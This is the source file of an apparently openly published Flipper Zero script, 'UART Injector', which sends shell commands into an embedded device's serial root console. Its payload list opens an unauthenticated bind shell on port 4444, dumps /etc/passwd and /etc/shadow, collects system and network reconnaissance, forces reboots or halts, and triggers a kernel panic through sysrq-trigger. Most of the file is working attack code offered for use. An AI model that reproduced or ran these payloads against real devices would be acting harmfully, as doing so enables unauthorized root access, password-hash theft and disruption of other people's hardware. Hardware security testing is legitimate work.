/*****************************************
 * 
 * Script: UART Injector
 * 
 * Author: Jaxhax-Travis
 * 
 * Repo: https://github.com/jaxhax-travis/flipper-js-uart-injector
 * 
 * Purpose: A script to use the Flipper Zero as a standalone UART
 *          command injector.  Wire it up, Select the baud rate and
 *          payload, and fire away.  This supports capturing the
 *          output from the commands and saving it to the SD card.
 * 
 * **************************************/

let submenu = require("submenu");
let serial = require("serial");
let storage = require("storage");
let keyboard = require("keyboard");
let dialog = require("dialog");

let version = "v1.0";

let log_folder = "/ext/apps_data/uart_injector";

/**
 * Flipper JS doesn't support the class so
 * an object generating function is a close
 * second.
 * */
function Payload(title, payload, post_func) {
    return {
        title: title,
        payload: payload,
        post_func : post_func
    };
}

////////////////////////////////////////////
// Post Payload handler functions
////////////////////////////////////////////
function postNOP(payload) { return; }

function postReadUntilPrompt(payload) {
    print("Reading Output...");
    let console_resp = serial.readAny(2500);
    let buf = "";
    while ( console_resp !== undefined ) {
        print(console_resp);
        buf += console_resp;
        console_resp = serial.readAny(2500);
    }

    let offset = buf.indexOf(payload.payload);
    if (offset > 0) {
        buf = buf.substring(offset);
    }

    if (buf.length === 0) {
        return
    }
    saveData(buf)
}

////////////////////////////////////////////
// Presented options for user selection
//     Edit these to your liking!
////////////////////////////////////////////
let BAUDRATES = [
    115200, 
    9600,
    4800,
    19200,
    38400,
    57600,
    230400,
    460800,
    921600
];

let PAYLOADS = [
    Payload(
        "Bindsh 4444 - Telnetd",
        "telnetd -p 4444 -l /bin/sh",
        postNOP
    ),
    Payload(
        "Get passwd + shadow",
        'echo "---===[ /etc/passwd ]===---"; cat /etc/passwd; echo -e "\n---===[ /etc/shadow ]===---"; cat /etc/shadow',
        postReadUntilPrompt
    ),
    Payload(
        "Get MTD info",
        'for i in $(seq 0 100); do  if [ -d /sys/class/mtd/mtd${i} ]; then echo -e "---===[ /dev/mtd${i} - $(cat /sys/class/mtd/mtd${i}/name) ]===---"; echo -e "  [*] Type: $(cat /sys/class/mtd/mtd${i}/type)"; echo -e "  [*] Size: $(cat /sys/class/mtd/mtd${i}/size)\n"; fi; done;',
        postReadUntilPrompt
    ),
    Payload(
        "Get System info",
        'echo "\n\t---===[ System Info ]===---\n"; echo -e " [*] Hostname: $(hostname)"; echo -e " [*] Uname: $(uname -a)"; echo -e " [*] Cmdline: $(cat /proc/cmdline)"; echo -e " [*] Boardtype: $(cat /proc/board_type)"; echo -e "\n\n\t---===[ Network Info ]===---\n"; ifconfig; echo ""; netstat; echo -e "\n\n\t---===[ CPU and Memory ]===---\n"; cat /proc/cpuinfo; echo ""; cat /proc/meminfo; echo -e "\n\n\t---===[ Mounts ]===---\n"; mount; echo -e "\n\n\t---===[ Busybox Applets ]===---\n"; busybox --help; echo -e "\n\n\t---===[ Processes ]===---\n"; ps;',
        postReadUntilPrompt
    ),
    Payload(
        "Reboot",
        "reboot",
        postNOP
    ),
    Payload(
        "Reboot (Force)",
        "reboot -f",
        postNOP
    ),
    Payload(
        "Halt",
        "halt",
        postNOP
    ),
    Payload(
        "Halt (Force)",
        "halt -f",
        postNOP
    ),
    Payload(
        "Poweroff",
        "poweroff",
        postNOP
    ),
    Payload(
        "Poweroff (Force)",
        "poweroff -f",
        postNOP
    ),
    Payload(
        "Kernel Panic Device",
        "echo 'c' > /proc/sysrq-trigger",
        postReadUntilPrompt
    ),
];

////////////////////////////////////////////
// Support functions for application
////////////////////////////////////////////
function createLogFolder() {
    if (!storage.exists(log_folder)) {
        let result = storage.mkdir(log_folder);
        if (!result) {
          print("Failed to create log directory");
          print(log_folder);
          return
        }
    }
}

function saveData(buf) {
    createLogFolder();

    let filepath = uiGetLogFilename();
    if (filepath.length === 0 ) {
        return;
    }
    let result = storage.write(filepath, buf);
    if (result) {
       print("Saved to log file:");
       print(filepath)
       dialog.message("Log Saved!", filepath);
    } else {
        die("Failed to save file");
    }
}

function checkForPrompt() {
    print("Check for Prompt...");
    serial.write([0x0a]);
    let console_resp = serial.expect("# ", 1000);
    if (console_resp === undefined) {
        print("No CLI response");
        return false;
    }
    print("Got prompt!");
    return true;
}

function injectCmd(baudrate, payload) {
    serial.setup("usart", baudrate);

    if (!checkForPrompt()) {
        serial.end();
        return;
    }

    print("Attempting to disable echo");
    serial.write("stty -echo\n");
    if (!checkForPrompt()) {
        serial.end();
        return;
    }

    print("Sending Payload...");
    serial.write(payload.payload + "\n");

    payload.post_func(payload);

    serial.end();
}

////////////////////////////////////////////
//             UI functions
////////////////////////////////////////////
function uiGetBaudrate() {
    submenu.setHeader("Choose Baudrate");

    for (let i = 0; i < BAUDRATES.length; i++) {
        submenu.addItem(to_string(BAUDRATES[i]), i);
    }

    let baudrate = submenu.show();

    if (baudrate === undefined) {
        die("User pressed back");
    }

    baudrate = BAUDRATES[baudrate];
    print("Baudrate: " + to_string(baudrate));

    return baudrate;
}

function uiGetPayload() {
    submenu.setHeader("Select Payload");
    for (let i = 0; i < PAYLOADS.length; i++) {
        submenu.addItem(PAYLOADS[i].title, i);
    }

    let payload = submenu.show();
    if (payload === undefined) {
        die("User pressed back");
    }

    payload = PAYLOADS[payload];

    print("Payload:\n" + payload.title);

    return payload;
}

function uiGetLogFilename() {
    let filepath = log_folder + "/";
    let logfile = "uart_log";
    while (true) {
        keyboard.setHeader("LogFile Name");
        logfile = keyboard.text(26, logfile, true);

        if (logfile === undefined || logfile === "") {
            if (uiConfirmDiscard()) {
                return "";
            }
            logfile = "uart_log";
            continue;
        }

        if (logfile.indexOf(".txt") === -1) {
            logfile += ".txt";
        }

        if (storage.exists(filepath + logfile)){
            dialog.message("Error", "Log File Exist");
        } else {
            break;
        }
    }
    return filepath + logfile;
}

function uiConfirmDiscard() {
    let dialog_params = ({
        header: "Exit without saving?",
        text: "Do you want to discard data?",
        button_left: "Yes",
        button_right: "No",
        button_center: undefined
    });

    let result = dialog.custom(dialog_params);
    if (result === dialog_params.button_left) {
        return true;
    } else {
        return false;
    }
}

////////////////////////////////////////////
// Main Code
////////////////////////////////////////////
dialog.message("UART Injector " + version, "Use Pins 13/14, select\nbaud rate & payload");
let baudrate = uiGetBaudrate();
let payload = uiGetPayload();
injectCmd(baudrate, payload);
